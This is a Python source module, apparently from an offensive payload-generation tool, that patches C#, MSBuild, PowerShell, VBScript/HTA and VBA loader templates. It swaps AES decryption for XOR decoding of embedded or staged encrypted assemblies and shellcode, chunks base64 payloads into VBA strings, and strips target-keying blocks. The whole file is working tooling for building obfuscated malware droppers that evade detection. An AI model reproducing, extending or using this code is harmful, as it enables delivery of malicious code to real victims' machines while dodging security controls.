import base64
import os
import re
import sys

CHUNK_SIZE = 800


def remove_block(template: str, start_marker: str, end_marker: str) -> str:
    pattern = re.compile(
        rf"^.*{re.escape(start_marker)}.*$\n(.*?\n)*?^.*{re.escape(end_marker)}.*$\n?",
        re.MULTILINE,
    )
    return pattern.sub("", template)


def uncomment_block(template: str, start_marker: str, end_marker: str) -> str:
    lines = template.split("\n")
    in_block = False
    result = []
    for line in lines:
        if start_marker in line:
            in_block = True
            continue
        elif end_marker in line:
            in_block = False
            continue
        elif in_block:
            if line.startswith("    ' "):
                result.append("    " + line[6:])
            elif line.strip() == "'":
                result.append("")
            else:
                result.append(line)
        else:
            result.append(line)
    return "\n".join(result)


def uncomment_csharp_block(template: str, start_marker: str, end_marker: str) -> str:
    lines = template.split("\n")
    in_block = False
    result = []
    for line in lines:
        if start_marker in line:
            in_block = True
            continue
        elif end_marker in line:
            in_block = False
            continue
        elif in_block:
            if line.startswith("// "):
                result.append(line[3:])
            elif line.strip() == "//":
                result.append("")
            else:
                result.append(line)
        else:
            result.append(line)
    return "\n".join(result)


def build_vba_chunks(b64_payload: str) -> str:
    chunks = [b64_payload[i : i + CHUNK_SIZE] for i in range(0, len(b64_payload), CHUNK_SIZE)]
    lines = []
    for chunk in chunks:
        lines.append(f'    s = s & "{chunk}"')
    return "\n".join(lines)


def load_template(template_path: str) -> str:
    if not os.path.exists(template_path):
        print(f"[-] Template not found: {template_path}", file=sys.stderr)
        sys.exit(1)
    with open(template_path, "r") as f:
        return f.read()


def get_template_path(name: str, custom: str = None) -> str:
    if custom:
        return custom
    return os.path.join(os.path.dirname(__file__), "templates", name)


def inject_placeholders(template: str, replacements: dict) -> str:
    for placeholder, value in replacements.items():
        template = template.replace(placeholder, value)
    return template


def enforce_ascii(content: str) -> str:
    return content.encode("ascii", errors="ignore").decode("ascii")


# --- C# XOR patching (Strategy A) ---

def _csharp_aes_method(indent: int) -> str:
    sp = " " * indent
    return (
        f"{sp}static byte[] AesDecrypt(byte[] data, byte[] key, byte[] iv)\n"
        f"{sp}{{\n"
        f"{sp}    using (RijndaelManaged aes = new RijndaelManaged())\n"
        f"{sp}    {{\n"
        f"{sp}        aes.Key = key;\n"
        f"{sp}        aes.IV = iv;\n"
        f"{sp}        aes.Mode = CipherMode.CBC;\n"
        f"{sp}        aes.Padding = PaddingMode.PKCS7;\n"
        f"{sp}        ICryptoTransform decryptor = aes.CreateDecryptor();\n"
        f"{sp}        return decryptor.TransformFinalBlock(data, 0, data.Length);\n"
        f"{sp}    }}\n"
        f"{sp}}}"
    )


def _csharp_xor_method(indent: int) -> str:
    sp = " " * indent
    return (
        f"{sp}static byte[] XorDecrypt(byte[] data, byte[] key)\n"
        f"{sp}{{\n"
        f"{sp}    byte[] result = new byte[data.Length];\n"
        f"{sp}    for (int i = 0; i < data.Length; i++)\n"
        f"{sp}        result[i] = (byte)(data[i] ^ key[i % key.Length]);\n"
        f"{sp}    return result;\n"
        f"{sp}}}"
    )


def patch_csharp_for_xor(template: str, indent: int = 8, is_msbuild: bool = False,
                         body_indent: int = None) -> str:
    template = template.replace(
        _csharp_aes_method(indent), _csharp_xor_method(indent)
    )

    sp = " " * indent
    sp2 = " " * (body_indent if body_indent is not None else indent + 4)

    template = template.replace(f'{sp}static string IV_B64 = "YOURIVHERE";\n', "")
    template = template.replace(f'{sp}static string KEYING = "YOURKEYINGHERE";\n', "")
    template = template.replace(f'{sp}static string SALT_B64 = "YOURSALTHERE";\n', "")

    if is_msbuild:
        template = template.replace(f'{sp}static string STAGED_URL = "YOURSTAGEDURL";\n', "")

    # Remove DeriveKey method (and FetchPayload for msbuild since staged+xor is blocked)
    derive_start = f"{sp}static byte[] DeriveKey(string saltB64, string keying)\n{sp}{{"
    derive_end = f"{sp}}}\n\n{sp}static string ENCRYPTED_B64"

    if derive_start in template:
        idx_start = template.index(derive_start)
        idx_end = template.index(derive_end)
        after_marker = f"{sp}static string ENCRYPTED_B64"
        template = template[:idx_start] + after_marker + template[idx_end + len(derive_end) :]

    if not is_msbuild:
        template = template.replace("using System.Security.Cryptography;\n", "")
        template = template.replace("using System.Text;\n", "")

    # Simplify decryption call — replace AES keying/decrypt block with XOR
    if is_msbuild:
        aes_call = (
            f"{sp2}byte[] encrypted;\n"
            f"{sp2}if (STAGED_URL.Length > 0)\n"
            f"{sp2}    encrypted = FetchPayload(STAGED_URL);\n"
            f"{sp2}else\n"
            f"{sp2}    encrypted = Convert.FromBase64String(ENCRYPTED_B64);\n"
            f"\n"
            f"{sp2}byte[] key;\n"
            f"{sp2}if (KEYING.Length > 0)\n"
            f"{sp2}    key = DeriveKey(SALT_B64, KEYING);\n"
            f"{sp2}else\n"
            f"{sp2}    key = Convert.FromBase64String(KEY_B64);\n"
            f"{sp2}byte[] iv = Convert.FromBase64String(IV_B64);\n"
            f"\n"
            f"{sp2}byte[] clearAssembly;\n"
            f"{sp2}try\n"
            f"{sp2}{{\n"
            f"{sp2}    clearAssembly = AesDecrypt(encrypted, key, iv);\n"
            f"{sp2}}}\n"
            f"{sp2}catch (CryptographicException)\n"
            f"{sp2}{{\n"
            f'{sp2}    Console.Error.WriteLine("Decryption failed -- key mismatch (wrong target?)");\n'
            f"{sp2}    return true;\n"
            f"{sp2}}}\n"
            f"\n"
            f"{sp2}Array.Clear(encrypted, 0, encrypted.Length);\n"
            f"{sp2}Array.Clear(key, 0, key.Length);\n"
            f"{sp2}Array.Clear(iv, 0, iv.Length);"
        )
    else:
        aes_call = (
            f"{sp2}byte[] encrypted = Convert.FromBase64String(ENCRYPTED_B64);\n"
            f"\n"
            f"{sp2}byte[] key;\n"
            f"{sp2}if (KEYING.Length > 0)\n"
            f"{sp2}    key = DeriveKey(SALT_B64, KEYING);\n"
            f"{sp2}else\n"
            f"{sp2}    key = Convert.FromBase64String(KEY_B64);\n"
            f"{sp2}byte[] iv = Convert.FromBase64String(IV_B64);\n"
            f"\n"
            f"{sp2}byte[] clearAssembly;\n"
            f"{sp2}try\n"
            f"{sp2}{{\n"
            f"{sp2}    clearAssembly = AesDecrypt(encrypted, key, iv);\n"
            f"{sp2}}}\n"
            f"{sp2}catch (CryptographicException)\n"
            f"{sp2}{{\n"
            f'{sp2}    Console.Error.WriteLine("Decryption failed -- key mismatch (wrong target?)");\n'
            f"{sp2}    return;\n"
            f"{sp2}}}\n"
            f"\n"
            f"{sp2}Array.Clear(encrypted, 0, encrypted.Length);\n"
            f"{sp2}Array.Clear(key, 0, key.Length);\n"
            f"{sp2}Array.Clear(iv, 0, iv.Length);"
        )

    xor_call = (
        f"{sp2}byte[] encrypted = Convert.FromBase64String(ENCRYPTED_B64);\n"
        f"{sp2}byte[] key = Convert.FromBase64String(KEY_B64);\n"
        f"{sp2}byte[] clearAssembly = XorDecrypt(encrypted, key);\n"
        f"\n"
        f"{sp2}Array.Clear(encrypted, 0, encrypted.Length);\n"
        f"{sp2}Array.Clear(key, 0, key.Length);"
    )

    template = template.replace(aes_call, xor_call)

    return template


# --- PowerShell XOR patching (Strategy B) ---

def patch_powershell_for_xor(template: str) -> str:
    template = remove_block(template, "# DECRYPT_AES_START", "# DECRYPT_AES_END")

    xor_block = (
        '$enc=[Convert]::FromBase64String("YOURPAYLOADHERE")\n'
        "$clear=New-Object byte[] $enc.Length\n"
        "for($i=0;$i -lt $enc.Length;$i++){\n"
        "$clear[$i]=$enc[$i] -bxor $keyBytes[$i % $keyBytes.Length]\n"
        "}\n"
    )
    template = template.replace(
        "$enc=$null;$keyBytes=$null;$ivBytes=$null",
        xor_block + "\n$enc=$null;$keyBytes=$null",
    )

    return template


# --- VBScript/HTA/VBA XOR patching (Strategy C) ---

def patch_vbs_for_xor(template: str) -> str:
    template = remove_block(template, "' DECRYPT_AES_START", "' DECRYPT_AES_END")
    template = uncomment_block(template, "' DECRYPT_XOR_START", "' DECRYPT_XOR_END")
    return template


# --- Shellcode XOR injection (Strategy D) ---

def patch_shellcode_for_xor(template: str, key_b64: str) -> str:
    xor_decode_block = f'''
    ' XOR decode
    Dim keyElem As Object
    Set keyElem = CreateObject("MSXML2.DOMDocument.3.0").createElement("k")
    keyElem.dataType = "bin.base64"
    keyElem.Text = "{key_b64}"
    Dim xKey() As Byte
    xKey = keyElem.nodeTypedValue
    Dim xi As Long
    For xi = 0 To UBound(scBytes)
        scBytes(xi) = scBytes(xi) Xor xKey(xi Mod (UBound(xKey) + 1))
    Next xi
    Set keyElem = Nothing
'''
    template = template.replace(
        "    ' ALLOC_START", xor_decode_block + "\n    ' ALLOC_START"
    )
    return template


def remove_wait_block(template: str) -> str:
    return remove_block(template, "' WAIT_START", "' WAIT_END")
